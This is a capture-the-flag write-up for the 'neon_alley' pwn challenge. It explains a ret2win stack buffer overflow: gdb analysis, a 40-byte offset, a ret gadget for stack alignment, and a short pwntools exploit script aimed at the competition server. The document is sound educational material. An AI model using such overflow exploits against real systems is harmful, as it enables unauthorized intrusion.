---
title: "CYBERMAZE 5 (2025) - neon_alley "
date: 2025-12-01 05:10:00 +0100
categories: [cybermaze_v5]
tags: [pwn, ret2win, writeup, spark , isetcom , easy , cybermaze_v5]
---

# [ neon_alley ] Writeup  

**Category:** [pwn]  
**Points:** [500]        
**Author:** 4n7h4r4x  


[You can download the files from my github and replay them !](https://github.com/YahyaMouelhi/cybermaze_v5)


![challenge](/assets/images/cybermaze_v5/neon_alley/neon_alley_challenge.png)


## Tools Used

- `gdb` / `ropper` 
- `python3 (pwntools)` for exploit scripting  

---

## Analysis

- The goal of of this challenge is super simple and fundamental and a must know for every pwner , it's ret2win -> basically returning to function that was never called which intrests us

- Let's run the basics commands **file and checksec** on the binary and see what we'll get :

![file and checksec output](/assets/images/cybermaze_v5/neon_alley/file_checksec_neonalley.png)

- Let's go directly to gdb and analyse the binary and see what functions we have and more ...

![gdb output](/assets/images/cybermaze_v5/neon_alley/info_func_neon_alley.png)

![gdb2 output](/assets/images/cybermaze_v5/neon_alley/disass_main_neon_alley.png)

![gdb3 output](/assets/images/cybermaze_v5/neon_alley/enter_neon_alley_disass.png)


- From these pictures we can get the addresses of win and see that inside the enter function it uses gets to read input from user in rbp-0x20 so the distance between rbp and our variable is 0x20 meaning the distance between our variable and the **RIP** = 0x28 ( 40 bytes ) ,
and of course u can use the tool **cyclic** or whatever u are used to and you'll get the same value , one final trick to consider is :


![ropper output](/assets/images/cybermaze_v5/neon_alley/neon_alley_ropper_ret.png)


- We'll use the ret instruction to align the stack and make everything works as expected ( if you try to just directly return to win you'll face a segfault and you won't get the flag)


## Exploitation / Solution

- now finally we can start writing the exploit script and this is what i ended up writing , it's really simple :

```python

from pwn import *

context.binary = elf = ELF("./neon_alley")

win = elf.symbols["win"]
ret = 0x401016

# offset to rbp + 8
pay = b"A"*40 + p64(ret) + p64(win)

#p = elf.process()
#p = remote("localhost" , 6100)
p = remote("tcp.espark.tn"  ,6100)

p.sendline(pay)
p.interactive()


```

- if we run it we get this :

![solver.py output](/assets/images/cybermaze_v5/neon_alley/neon_alley_flag.png)


- Thanks for reading hope this was helpful !
